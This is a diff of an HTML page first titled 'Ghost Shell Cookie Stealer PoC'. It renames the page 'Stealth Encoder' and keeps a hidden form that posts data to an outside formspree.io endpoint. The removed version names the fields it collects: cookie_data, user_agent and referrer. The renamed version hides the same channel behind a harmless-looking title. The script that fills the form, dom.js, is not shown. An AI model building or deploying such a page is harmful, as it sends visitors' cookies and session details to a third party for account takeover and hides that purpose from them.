@@ -3,37 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ghost Shell Cookie Stealer PoC</title>
+    <title>Stealth Encoder</title>
     <style>
         body {
             background-color: black;
             color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
             font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
         }
         h2 {
-            text-align: center;
             color: gold;
             text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
-        }
-        form {
-            display: none;
         }
     </style>
 </head>
 <body>
-
-    <h2>Ghost Shell Cookie Stealer Hidden PoC</h2>
-
-    <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST">
-        <input type="hidden" name="cookie_data" id="cookieField">
-        <input type="hidden" name="user_agent" id="userAgentField">
-        <input type="hidden" name="referrer" id="referrerField">
-        <input type="hidden" name="fallback" value="not_empty">
+    <h2>Stealth Encoder</h2>
+    <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST" style="display: none;">
+        <input type="hidden" name="data" id="encodedData">
+        <button type="submit">Send</button>
     </form>
 
     <script src="dom.js"></script>
